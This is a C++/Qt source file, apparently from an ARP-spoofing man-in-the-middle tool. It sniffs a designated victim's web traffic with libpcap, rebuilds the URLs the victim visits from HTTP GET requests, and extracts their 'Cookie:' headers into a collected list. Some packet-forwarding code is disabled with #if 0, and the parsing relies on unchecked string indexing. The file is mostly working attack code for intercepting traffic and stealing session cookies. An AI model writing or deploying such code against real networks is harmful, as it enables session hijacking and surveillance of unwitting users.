#include "relay_spoof.h"
#include <QCoreApplication>

void getUrl(u_char *packet, int len);
void sendUrl(u_char *packet, int len);

QStringList relay_url_list, relay_data_list;
int get_broad_cnt = 0, test_cnt = 0;

u_char spoofAtkMac[6], spoofRouterMac[6], spoofVictimMac[6];
pcap_t *spoofPcap;
pcap_if_t *spoofDevs;

relay_spoof::relay_spoof(QObject *parent) : QThread(parent) {

}

void relay_spoof::run() {
    int cnt = 0;
    bpf_u_int32 netp, maskp;
    struct bpf_program filter;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr *pkthdr;
    u_char *packet;
    struct libnet_ethernet_hdr *eth;

    if(pcap_lookupnet(spoofDevs->name, &netp, &maskp, errbuf) == -1) exit(1);
    spoofPcap = pcap_open_live(spoofDevs->name, 65535, 0, -1, errbuf);
    if(pcap_compile(spoofPcap, &filter, "tcp port 80 or tcp port 443 or tcp port 8080", 0, maskp) == -1) exit(1);
    if(pcap_setfilter(spoofPcap, &filter) == -1) exit(1);

    pre_filter(relayAtkMac.toLatin1().data(), spoofAtkMac, ETHER_ADDR_LEN, "upper");
    pre_filter(relayRouterMac.toLatin1().data(), spoofRouterMac, ETHER_ADDR_LEN, "upper");
    pre_filter(relayVictimMac.toLatin1().data(), spoofVictimMac, ETHER_ADDR_LEN, "upper");

    spoofStop = false;

    while(1) {
        while((cnt = pcap_next_ex(spoofPcap, &pkthdr, (const u_char**)&packet)) > 0) {
            eth = (struct libnet_ethernet_hdr *)packet;

            if(flag_check(eth->ether_dhost, spoofAtkMac, ETHER_ADDR_LEN) != 1 && flag_check(eth->ether_shost, spoofRouterMac, ETHER_ADDR_LEN) == 1 && flag_check(eth->ether_shost, spoofVictimMac, ETHER_ADDR_LEN) != 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
#if 0
                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                    *(packet + i) = *(spoofRouterMac + i);
                    *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                }
                pcap_sendpacket(spoofPcap, packet, pkthdr->len);
                printf("\n##### Host Get Packet #####\n");
                print_packet(pkthdr->len, packet);
#endif
                getUrl(packet, pkthdr->len);
                if(get_broad_cnt != test_cnt) {
                    emit relay_urlList(relay_url_list);
                    test_cnt++;
                }
            }
            if(flag_check(eth->ether_dhost, spoofAtkMac, ETHER_ADDR_LEN) != 1 && flag_check(eth->ether_shost, spoofRouterMac, ETHER_ADDR_LEN) != 1 && flag_check(eth->ether_shost, spoofVictimMac, ETHER_ADDR_LEN) == 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
#if 0
                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                    *(packet + i) = *(spoofVictimMac + i);
                    *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                }
                pcap_sendpacket(spoofPcap, packet, pkthdr->len);
                printf("\n##### DNS Packet #####\n");
                print_packet(length, packet);
#endif
                sendUrl(packet, pkthdr->len);
            }
        }
        if(spoofStop) break;
    }
    emit relay_dataList(relay_data_list);
    emit relay_spoofFin(true);
}

void getUrl(u_char *packet, int len) {
    int i = 0, tmp = 0, cnt = 0, get_len = len;
    bool var = false;
    u_char *text = packet;
    QString imsi, tempStr;
    text += 54;
    get_len -= 54;
    while(get_len > 0) {
        if(*(text+i) == 71 && *(text+i+1) == 69 && *(text+i+2) == 84)
            while(get_len > 0) {
                if(*(text+i) > 32 && *(text+i) < 127) {
                    tempStr.append(*(text+i));
                    tmp = 0;
                    var = true;
                }
                if(*(text+i) < 32 && var == true) tempStr.append('.');
                else if(*(text+i) == 32 && var == true) tempStr.append(' ');
                i++;
                get_len--;
            }
        i++;
        get_len--;
        if(var == true) break;
    }
    i = 0; tmp = 0;
    if(!tempStr.isEmpty()) {
//        qDebug() << "#####getUrl : " << tempStr;
        while(true) {
            if(tempStr.at(i) == 'H' && tempStr.at(i+1) == 'o' && tempStr.at(i+2) == 's' && tempStr.at(i+3) == 't' && tempStr.at(i+4) == ':') {
                i += 6;
                imsi.append("http://");
                while(true) {
                    if((tempStr.at(i) == '.' && tempStr.at(i+1) == '.') || tempStr.length() == i) break;
                    imsi.append(tempStr.at(i++));
                }
                i -= (tmp + imsi.length() - 1);
                while(true) {
                    if(tempStr.at(i) == 'G' && tempStr.at(i+1) == 'E' && tempStr.at(i+2) == 'T' && tempStr.at(i+5) != ' ') {
                        i += 4;
                        while(true) {
                            imsi.append(tempStr.at(i++));
                            if(tempStr.at(i) == '/' && tempStr.at(i+1) == ' ') break;
                            else if((tempStr.at(i+1) == 'H' && tempStr.at(i+2) == 'T' && tempStr.at(i+3) == 'T' && tempStr.at(i+4) == 'P' && tempStr.at(i+5) == '/') || tempStr.length() == i) break;
                        }
                    }
                    else if(tempStr.length() == (++i)) break;
                }
                if(!relay_url_list.isEmpty()) for(tmp = 0; tmp < relay_url_list.length(); tmp++) if(relay_url_list.at(tmp) == imsi) cnt = 100;
                if(cnt != 100) {
                    get_broad_cnt++;
                    imsi.detach();
                    relay_url_list.append(imsi);
                }
            }
            if(tempStr.length() <= (++i)) break;
            else tmp = i;
        }
        i = 0; imsi.clear();
        if(tempStr.contains("Cookie: ")) {
            while(true) {
                if(tempStr.at(i) == 'C' && tempStr.at(i+1) == 'o' && tempStr.at(i+2) == 'o' && tempStr.at(i+3) == 'k' && tempStr.at(i+4) == 'i' && tempStr.at(i+5) == 'e' && tempStr.at(i+6) == ':' && tempStr.at(i+7) == ' ') {
                    while(true) {
                        imsi.append(tempStr.at(i++));
                        if(tempStr.at(i) == '.' && tempStr.at(i+1) == '.' && tempStr.at(i+2) == '.' && tempStr.at(i+3) == '.') break;
                    }
                    relay_data_list.append(imsi);
                    break;
                }
                else if(tempStr.length() == (++i)) break;
            }
        }
        else relay_data_list.append("Not exist cookie");
        qDebug() << "#####Cookie : " << relay_data_list.at(get_broad_cnt - 1);
    }
}

void sendUrl(u_char *packet, int len) {
    QString tempStr;
    u_char *text = packet;
    for(int i = 0; i < (len - 1); i++) tempStr.append(*(text+i));
//    qDebug() << "sendUrl : " << tempStr;
}

void relay_spoof::relayGetMacInfo(QString victim, QString atk, QString router, pcap_if_t *devs) {
    relayVictimMac = victim;
    relayAtkMac = atk;
    relayRouterMac = router;
    spoofDevs = devs;
}
